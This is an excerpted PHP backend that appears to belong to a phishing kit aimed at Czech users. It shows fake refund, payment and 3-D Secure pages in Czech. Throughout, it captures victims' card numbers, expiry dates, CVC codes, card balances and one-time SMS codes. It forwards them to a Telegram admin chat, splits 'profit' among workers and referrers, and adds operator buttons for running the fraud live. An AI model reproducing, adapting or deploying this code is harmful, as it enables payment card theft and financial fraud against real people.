...
<?php
	...
	switch ($action) {
		...
		case '3ds': {
			...
			$isnt = ($isnt == '1');
			$msg = [false, 'Na vaše telefonní číslo byl zaslán jednorázový kód. Zkontrolujte prosím podrobnosti transakce a zadejte jednorázový kód.'];
			$code3ds = substr(beaText($_POST2['3dscode'], chsNum()), 0, 20);
			if ($code3ds && strlen($code3ds) > 2) {
				$msg = [true, 'Zadali jste nesprávný kód. Zkontrolujte prosím kód zprávy a zadejte jej znovu.'];
				...
				if ($lastcode != $code3ds) {
					...
					botSend([
						...
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'💵 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
						...
						[
							['text' => '✅ Оплатил', 'callback_data' => '/doruchkazaletchex '.$t],
						],
						[
							['text' => '❌ Звонок 900', 'callback_data' => '/doruchkafail1chex '.$t],
							['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2chex '.$t],
						],
					]]);
		...
		case 'order': case 'buy': case 'cash': case 'rent' : case 'cars': {
			...
			if ($hash0 != getIpData($ip, 'hash')/getCookieData('hash', $_COOKIE2)) {
				...
				botSend([
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💵 Стоимость: <b>'.beaCashchex($amount).'</b>',
		...
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			...
			$ttx = [
				...
				[
					...
					'Dostávat',
					'Zotavení',
					'Za účelem vrácení částky musíme na vaší kartě rezervovat prostředky ve výši transakce.',
				],
				[
					'получения средств',
					'Přijímám',
					...
					'Chcete-li získat peníze za placený produkt, musí zůstatek na vaší kartě činit alespoň částku transakce.',
				],
			][$isnr];
			if($iscars == 'true')
			{
    ...
    if ($pares && $merchant && isPayData($merchant)) {
				...
				if ($psts[0]) {
					...
					$profit = makeProfitchex($id, $isnr, $amount, $pkoef);
					...
					$pmess = [
						$pkoef2,
						'',
						'⚖️ Доля воркера: <b>'.beaCashchex($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
					...
					$t0 = [
						$pkoef2,
						'',
				 		'❤️ Ваша доля: <b>'.beaCashchex($profit[0]).'</b>',
						'💸 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
					...
					botSend([
						...
						'💸 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'💎 Доля воркера: <b>'.beaCashchex($profit[0]).'</b>',
						'🐤 Доля реферала: <b>'.beaCashchex($profit[1]).'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
				...
				// 		'💳 Карта: <b>'.cardBank($card).'</b>',
					...
					if (!$isrpar) {
						$t1 = [
							'❄️ Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCashchex($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
					...
					if ($referal) {
						botSend([
							'👾 Вы получили <b>'.beaCashchex($profit[1]).'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
				...
				if (isValidCard($card, $expm, $expy, $cvc, $balancecard)) {
					...
					if ($isrpac) {
						...
						botSend([
							...
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
							'🚀 Баланс карты: <b>'.$balancecard.' CZK</b>',
							'',
							($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
							'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						], chatAdmin(), [true, [
					...
					if ($pcrt[0]) {
						...
						if (!isCardData($card, $expm, $expy, $cvc)) {
							...
							botSend([
								...
								'',
								'💸 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
								$_POST2['balancecard'] ? '💰 Баланс карты: <b>'.$balancecard.' CZK.</b>' : '',
								// '☘️ Номер: <b>'.$card.'</b>',
								// '📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								// '🕶 CVC: <b>'.$cvc.'</b>',
							...
							botSend([
								...
								'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								'🕶 CVC: <b>'.$cvc.'</b>',
								$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' CZK.</b>' : '',
								'',
								'💸 Сумма платежа: <b>'.beaCashchex($amount).'</b>',
								'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
							], chatAdmin());
			...
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				...
				$t = [
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💸 Общая сумма: <b>'.beaCashchex($amount).'</b>',
					'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					//'',
					//'🌎 IP: <b>'.$ip.'</b>',
					//'🔍 Локация: <b>'.$iploc.'</b>',
